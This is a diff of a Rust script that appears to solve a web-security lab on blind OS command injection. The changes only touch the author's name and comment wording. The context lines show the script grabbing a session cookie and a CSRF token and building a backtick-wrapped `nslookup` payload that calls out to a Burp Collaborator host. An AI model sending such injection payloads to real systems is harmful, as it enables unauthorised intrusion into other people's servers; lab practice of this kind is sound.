@@ -1,6 +1,6 @@
 /***********************************************************************************
 *
-* Author: Ahmed Elqalawy (@elqal3awii)
+* Author: Ahmed Elqalaawy (@elqal3awii)
 *
 * Date: 10/10/2023
 *
@@ -68,9 +68,9 @@ fn main() {
     let session = extract_session_cookie(feedback.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
-    // extract csrf token
+    // extract the csrf token
     let csrf =
-        extract_csrf(feedback).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
+        extract_csrf(feedback).expect(&format!("{}", "[!] Failed to extract the csrf token".red()));
 
     // the payload to issue a DNS lookup to burp collaborator
     let payload = format!("`nslookup {collaborator}`");
